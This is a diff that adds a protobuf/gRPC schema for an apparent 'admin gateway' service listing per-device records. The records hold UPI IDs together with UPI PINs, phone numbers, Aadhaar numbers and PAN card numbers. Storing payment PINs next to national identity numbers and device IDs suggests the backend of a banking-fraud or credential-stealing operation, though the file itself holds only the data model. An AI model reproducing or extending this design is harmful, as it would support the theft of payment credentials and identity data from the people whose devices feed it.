@@ -1,0 +1,40 @@
+syntax = "proto3";
+
+package vpa.v1;
+
+option java_multiple_files = true;
+option java_package = "com.admingateway.grpc.vpa";
+option java_outer_classname = "VpaGatewayProto";
+
+message ListVpaRequest {
+  string admin_id = 1;
+  string app_id = 2;
+  string device_id = 3;
+  string q = 4;
+  int32 page = 5;
+  int32 size = 6;
+}
+
+message VpaItem {
+  uint64 id = 1;
+  string admin_id = 2;
+  string app_id = 3;
+  string device_id = 4;
+  string upi_id = 5;
+  string upi_pin = 6;
+  string phone_number = 7;
+  string adhar_card = 8;
+  string pan_card = 9;
+  int64 event_timestamp_ms = 10;
+}
+
+message ListVpaResponse {
+  repeated VpaItem items = 1;
+  int32 page = 2;
+  int32 size = 3;
+  int32 count = 4;
+}
+
+service VpaService {
+  rpc ListVpa (ListVpaRequest) returns (ListVpaResponse);
+}
